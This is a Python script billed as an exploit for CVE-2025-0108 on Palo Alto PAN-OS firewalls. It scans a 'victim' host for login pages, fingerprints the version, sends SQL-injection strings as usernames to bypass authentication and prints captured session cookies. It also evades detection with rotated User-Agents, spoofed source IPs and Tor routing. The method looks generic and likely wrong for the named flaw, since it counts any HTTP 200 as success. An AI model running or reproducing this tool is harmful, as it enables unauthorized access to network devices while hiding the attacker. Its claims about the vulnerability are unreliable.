import requests
import argparse
import base64
import random
import threading
from urllib.parse import quote

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# User-Agent rotation to evade detection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0"
]

# Proxy configuration (optional: Tor support)
PROXY = {
    "http": "socks5h://127.0.0.1:9050",
    "https": "socks5h://127.0.0.1:9050"
}

# Vulnerable PAN-OS versions (update based on CVE details)
VULNERABLE_VERSIONS = ["10.2.2", "10.1.6", "10.0.9"]

# Authentication bypass payloads
BYPASS_PAYLOADS = [
    {"user": "admin' OR '1'='1", "password": "randompass"},
    {"user": "' OR 1=1 --", "password": "randompass"},
    {"user": "' OR 'x'='x", "password": "randompass"},
    {"user": "admin' #", "password": "randompass"},
    {"user": "admin") OR ("1"="1", "password": "randompass"}
]

def detect_firewall_version(target_url):
    """
    Attempts to detect the PAN-OS firewall version.
    """
    print("[*] Detecting firewall version...")

    # Try fetching version info from common API endpoints
    version_endpoints = [
        "/api/?type=op&cmd=<show><system><info></info></system></show>",
        "/restapi/v10.0/GlobalProtect/getconfig"
    ]
    
    headers = {"User-Agent": random.choice(USER_AGENTS)}

    for endpoint in version_endpoints:
        try:
            response = requests.get(target_url + endpoint, headers=headers, verify=False, timeout=5)
            
            if response.status_code == 200 and "sw-version" in response.text:
                version = response.text.split("<sw-version>")[1].split("</sw-version>")[0]
                print(f"[+] Detected PAN-OS Version: {version}")
                
                if version in VULNERABLE_VERSIONS:
                    print("[!] WARNING: This version is vulnerable!")
                    return version
                else:
                    print("[-] Target is running a patched version.")
                    return None
        except requests.exceptions.RequestException:
            continue

    print("[-] Unable to determine firewall version.")
    return None

def exploit(target_url, stealth_mode=False, use_proxy=False):
    """
    Attempts to exploit CVE-2025-0108 authentication bypass.
    """
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": "https://trusted-site.com",
        "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))  # Fake IP
    }

    if stealth_mode:
        print("[*] Running in stealth mode - Encoding payloads...")
        for payload in BYPASS_PAYLOADS:
            payload["user"] = quote(base64.b64encode(payload["user"].encode()).decode())

    session = requests.Session()
    if use_proxy:
        print("[*] Using Tor proxy for anonymity...")
        session.proxies.update(PROXY)

    for payload in BYPASS_PAYLOADS:
        try:
            response = session.post(target_url, data=payload, headers=headers, verify=False, timeout=5)
            
            if "success" in response.text or response.status_code == 200:
                print(f"[+] Authentication bypass successful with payload: {payload['user']}")
                
                # Extract session token
                if "Set-Cookie" in response.headers:
                    print("[+] Extracted Session Token:", response.headers["Set-Cookie"])
                
                return True
            else:
                print(f"[-] Bypass attempt failed with payload: {payload['user']}")

        except requests.exceptions.RequestException as e:
            print(f"[!] Connection error: {e}")

    return False

def scan_for_vulnerable_endpoints(target_host):
    """
    Scans for vulnerable API endpoints.
    """
    print("[*] Scanning for vulnerable API endpoints...")
    test_endpoints = ["/api/", "/admin/login", "/auth/", "/login", "/firewall/auth"]

    for endpoint in test_endpoints:
        url = f"{target_host}{endpoint}"
        try:
            response = requests.get(url, headers={"User-Agent": random.choice(USER_AGENTS)}, verify=False, timeout=5)
            if response.status_code == 200 and "login" in response.text.lower():
                print(f"[+] Potentially vulnerable endpoint found: {url}")
                return url
        except:
            pass

    print("[-] No vulnerable endpoints found.")
    return None

def main():
    parser = argparse.ArgumentParser(description="Advanced CVE-2025-0108 Exploit PoC with Firewall Version Detection")
    parser.add_argument("-t", "--target", required=True, help="Target firewall URL (e.g., https://victim.com)")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode with encoding")
    parser.add_argument("--proxy", action="store_true", help="Route requests through Tor for anonymity")
    args = parser.parse_args()

    target_url = scan_for_vulnerable_endpoints(args.target)
    if not target_url:
        print("[-] No vulnerable endpoints found. Exiting.")
        return

    print(f"[*] Targeting: {target_url}")

    firewall_version = detect_firewall_version(args.target)
    if not firewall_version:
        print("[!] Exiting since the firewall is not vulnerable.")
        return

    exploit(target_url, stealth_mode=args.stealth, use_proxy=args.proxy)

if __name__ == "__main__":
    main()
